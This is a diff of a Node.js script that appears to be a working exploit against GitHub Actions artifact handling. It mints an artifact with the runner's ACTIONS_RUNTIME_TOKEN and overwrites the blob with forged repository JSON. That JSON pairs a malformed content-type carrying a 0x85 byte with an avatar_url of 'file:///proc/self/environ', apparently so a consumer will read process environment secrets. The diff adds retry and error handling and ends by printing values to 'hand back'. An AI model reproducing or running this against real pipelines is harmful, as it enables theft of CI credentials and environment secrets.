@@ -13,18 +13,24 @@
 //
 // Everything uses node:https on purpose: undici/fetch rejects non-ASCII header values, the classic
 // client allows \x80-\xff (which is exactly what we need for the 0x85 byte).
-​
+
 const https = require('node:https');
 const { URL } = require('node:url');
 const crypto = require('node:crypto');
-​
-const RESULTS = process.env.ACTIONS_RESULTS_URL;
+
+const RESULTS = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL;
 const RUNTIME = process.env.ACTIONS_RUNTIME_TOKEN;
+console.log('[*] runner env present:', Object.keys(process.env)
+  .filter((k) => k.startsWith('ACTIONS_'))
+  .map((k) => `${k}(len=${String(process.env[k]).length})`).join(' ') || 'NONE');
+if (!RUNTIME || !RESULTS) {
+  throw new Error('ACTIONS_RUNTIME_TOKEN/ACTIONS_RESULTS_URL missing — run this as a JS action (uses: ./), not a run: step');
+}
 const GH_TOKEN = process.env.GH_TOKEN;
 const REPO = process.env.REPO;                 // owner/repo
 const NAME = process.env.ART_NAME || 'rc';
 const CT = 'application/json\u0085';           // the whole point
-​
+
 function req(method, url, headers, body) {
   const u = new URL(url);
   return new Promise((resolve, reject) => {
@@ -45,7 +51,7 @@ function req(method, url, headers, body) {
     r.end();
   });
 }
-​
+
 function backendIds() {
   const payload = JSON.parse(Buffer.from(RUNTIME.split('.')[1], 'base64url').toString('utf8'));
   const scope = (Array.isArray(payload.scp) ? payload.scp.join(' ') : String(payload.scp || ''))
@@ -54,19 +60,19 @@ function backendIds() {
   const [, run, job] = scope.split(':');
   return { workflow_run_backend_id: run, workflow_job_run_backend_id: job };
 }
-​
+
 const twirp = (rpc, payload) => req(
   'POST', `${RESULTS.replace(/\/$/, '')}/twirp/github.actions.results.api.v1.ArtifactService/${rpc}`,
   { 'content-type': 'application/json', authorization: `Bearer ${RUNTIME}` },
   JSON.stringify(payload),
 );
-​
+
 const api = (path) => req('GET', `https://api.github.com${path}`, {
   authorization: `Bearer ${GH_TOKEN}`,
   accept: 'application/vnd.github+json',
   'user-agent': 'forge',
 });
-​
+
 async function putBlob(signedUrl, bytes, contentType) {
   const headers = {
     'x-ms-blob-type': 'BlockBlob',
@@ -76,33 +82,44 @@ async function putBlob(signedUrl, bytes, contentType) {
   if (contentType) headers['x-ms-blob-content-type'] = contentType;
   return req('PUT', signedUrl, headers, bytes);
 }
-​
+
 (async () => {
   const ids = backendIds();
   console.log('[*] backend ids', ids);
-​
+
   const created = await twirp('CreateArtifact', { ...ids, name: NAME, version: 4 });
-  console.log('[*] CreateArtifact', created.status, created.body.toString('utf8').slice(0, 300));
-  const signed = JSON.parse(created.body.toString('utf8')).signed_upload_url;
+  const signed = (() => { try { return JSON.parse(created.body.toString('utf8')).signed_upload_url; }
+    catch { return undefined; } })();
+  console.log('[*] CreateArtifact', created.status, 'signed_upload_url?', !!signed,
+    signed ? '' : created.body.toString('utf8').slice(0, 300));
   if (!signed) throw new Error('no signed_upload_url');
-​
+
   const placeholder = Buffer.from('{}');
   const p1 = await putBlob(signed, placeholder, 'application/json');
   console.log('[*] PUT placeholder', p1.status, p1.body.toString('utf8').slice(0, 200));
-​
+
   const fin = await twirp('FinalizeArtifact', {
     ...ids, name: NAME, size: String(placeholder.length),
     hash: { value: `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}` },
   });
   console.log('[*] FinalizeArtifact', fin.status, fin.body.toString('utf8').slice(0, 300));
-​
-  // read the id back: the artifact bytes must contain it
-  const list = await api(`/repos/${REPO}/actions/artifacts?per_page=100`);
-  const artifacts = JSON.parse(list.body.toString('utf8')).artifacts || [];
-  const mine = artifacts.filter((a) => a.name === NAME).sort((a, b) => b.id - a.id)[0];
-  if (!mine) throw new Error('artifact not visible via API yet');
+
+  // read the id back: the artifact bytes must contain it. Finalize is async on GitHub's side, so
+  // the artifact can take a few seconds to show up in the REST listing.
+  let mine;
+  for (let i = 0; i < 12 && !mine; i += 1) {
+    const list = await api(`/repos/${REPO}/actions/artifacts?per_page=100`);
+    if (list.status !== 200) {
+      console.log('[!] artifact listing', list.status, list.body.toString('utf8').slice(0, 200));
+    } else {
+      const artifacts = JSON.parse(list.body.toString('utf8')).artifacts || [];
+      mine = artifacts.filter((a) => a.name === NAME).sort((a, b) => b.id - a.id)[0];
+    }
+    if (!mine) await new Promise((r) => setTimeout(r, 2500));
+  }
+  if (!mine) throw new Error('artifact never showed up in the REST listing');
   console.log('[*] artifact id', mine.id, 'expired', mine.expired);
-​
+
   const repository = `${REPO.toLowerCase()}/actions/artifacts/${mine.id}/zip`;
   const payload = Buffer.from(JSON.stringify({
     full_name: repository,
@@ -110,7 +127,7 @@ async function putBlob(signedUrl, bytes, contentType) {
     stargazers_count: 0,
     owner: { login: 'rc', avatar_url: 'file:///proc/self/environ' },
   }), 'utf8');
-​
+
   const p2 = await putBlob(signed, payload, CT);
   console.log('[*] PUT real bytes with custom content-type:', p2.status,
     p2.body.toString('utf8').slice(0, 400));
@@ -119,7 +136,7 @@ async function putBlob(signedUrl, bytes, contentType) {
     const p3 = await putBlob(signed, payload, 'application/json');
     console.log('[*] PUT fallback', p3.status, p3.body.toString('utf8').slice(0, 200));
   }
-​
+
   // verify what api.github.com actually serves (follow the redirect by hand)
   const dl = await req('GET', `https://api.github.com/repos/${REPO}/actions/artifacts/${mine.id}/zip`, {
     authorization: `Bearer ${GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'forge',
@@ -135,7 +152,7 @@ async function putBlob(signedUrl, bytes, contentType) {
   console.log('[*] final content-type (hex) :', Buffer.from(ctHeader, 'latin1').toString('hex'));
   console.log('[*] final body               :', final.body.toString('utf8').slice(0, 400));
   console.log('[*] final body sha256        :', crypto.createHash('sha256').update(final.body).digest('hex'));
-​
+
   console.log('\n===== HAND THIS BACK =====');
   console.log('REPOSITORY=' + repository);
   console.log('ARTIFACT_ID=' + mine.id);
